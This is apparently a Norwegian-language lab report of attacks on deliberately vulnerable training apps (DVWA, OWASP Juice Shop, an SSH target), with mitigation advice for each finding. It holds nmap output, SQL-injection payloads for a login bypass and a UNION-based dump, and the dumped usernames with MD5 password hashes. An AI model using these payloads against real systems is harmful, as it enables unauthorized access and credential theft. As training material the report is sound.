# SecForge – angrepsrapport

**Dato:** 2026-10-29 01:06
**Utført av:** Nima Maleki
**Omfang:** kun containerne i den isolerte SecForge-laben (dvwa, juice-shop, target-ssh). Ingen eksterne systemer er berørt.

> 🚧 Dette er en øvingsrapport fra et lukket læringsmiljø. Målene er med vilje sårbare apper laget for opplæring (DVWA, OWASP Juice Shop).

---

## Sammendrag av funn

| # | Mål | Funn | Alvorlighet |
|---|-----|------|-------------|
| 1 | juice-shop | SQL-injection gir innlogging uten passord + gyldig JWT | 🔴 Kritisk |
| 2 | dvwa | SQL-injection dumper alle brukernavn og passord-hasher | 🔴 Kritisk |
| 3 | juice-shop | Produktkatalog hentes ut via åpent API uten innlogging | 🟠 Middels |
| 4 | target-ssh | SSH-tjeneste eksponert med svakt passord | 🟠 Middels |

---

## 1. Rekognosering (nmap)

Først kartla jeg hvilke tjenester som kjører på målene:

```
Nmap scan report for dvwa (172.18.0.4)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Nmap scan report for juice-shop (172.18.0.5)
3000/tcp open  ppp?
Nmap scan report for target-ssh (172.18.0.2)
2222/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
```

**Lærdom:** åpne porter og versjonsnummer forteller en angriper nøyaktig hva som kan angripes. I produksjon bør man eksponere færrest mulig tjenester og skjule versjonsbannere.

---

## 2–3. Web-angrep (DVWA + Juice Shop)

Utdata fra angrepsskriptet:

```
### JUICE-SHOP – SQL-injection (innloggings-bypass)
  Payload e-post: ' OR 1=1--
  => INNLOGGET UTEN PASSORD som: admin@juice-sh.op
  => Fikk gyldig JWT-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ...
  => Produktkatalog via API: 46 produkter hentet ut uten innlogging

### DVWA – SQL-injection (dumper brukernavn + passord-hasher)
  Innlogging: OK (admin/password)
  Databasen opprettet/nullstilt
  Payload: 1' UNION SELECT user, password FROM users-- -
  => DUMPET FRA users-tabellen (brukernavn : passord-hash):
       admin : admin
       admin : 5f4dcc3b5aa765d61d8327deb882cf99
       gordonb : e99a18c428cb38d5f260853678922e03
       1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
       pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
       smithy : 5f4dcc3b5aa765d61d8327deb882cf99
```

### Hvordan SQL-injection fungerer
Appen limer brukerinput rett inn i en SQL-spørring. Ved å sende `' OR 1=1--` lukkes
tekststrengen og betingelsen blir alltid sann, slik at databasen returnerer alt –
eller logger oss inn som første bruker (admin).

### Tiltak (hvordan man stopper det)
- **Parameteriserte spørringer / prepared statements** – skill kode fra data.
- **Validér og begrens input** på serversiden.
- **Minste privilegium** på databasebrukeren.
- Lagre passord med **bcrypt/argon2**, aldri som ren MD5.
- Krev **autentisering** på API-endepunkter som eksponerer data.

---

## 4. SSH-tjeneste (target-ssh)

Banner lest fra tjenesten:

```
SSH-2.0-OpenSSH_10.3
```

Tjenesten er satt opp med et svakt, gjettbart passord – en klassisk inngang for
brute force-angrep.

### Tiltak
- Slå av passord-innlogging og bruk **SSH-nøkler**.
- Bruk **fail2ban** / rate-limiting mot gjentatte forsøk.
- Ingen standard- eller svake passord.

---

## Konklusjon
Alle fire funnene er klassiske svakheter fra OWASP Top 10 og CIS-anbefalingene.
Øvelsen viser både **hvordan** de utnyttes og, viktigere, **hvordan de forhindres** –
som er hele poenget med å trene i et trygt, isolert miljø.
